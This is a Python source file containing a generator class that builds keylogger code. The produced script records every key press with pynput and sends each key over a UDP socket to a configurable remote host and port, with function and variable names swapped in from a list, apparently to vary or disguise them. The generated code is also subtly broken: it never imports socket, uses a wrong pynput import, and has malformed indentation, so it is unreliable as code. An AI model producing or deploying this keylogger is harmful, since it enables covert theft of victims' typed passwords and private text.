class Payload:
    def __init__(self, host,port, strs):
        self.host,self.port,self.strs  = host,port,strs
    def create(self):
        return f"""
from pynput import Listener, Key
def {self.strs[0]}(k):\n\tconn.send(str(k).encode("UTF-8"))
{self.strs[1]} = False\nwhile not {self.strs[1]} :\n\ttry :
\t\tconn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
\t\tconn.connect(('{self.host}' , {self.port}))
\t\t{self.strs[1]} = True 
\texcept :\n\t{self.strs[1]} = False\n\twhile {self.strs[1]} :\n\t\ttry : 
\t\t\twith Listener(on_press={self.strs[0]}) as l:
\t\t\t\tl.join()
\t\texcept :
\t\t\t{self.strs[1]} = False
"""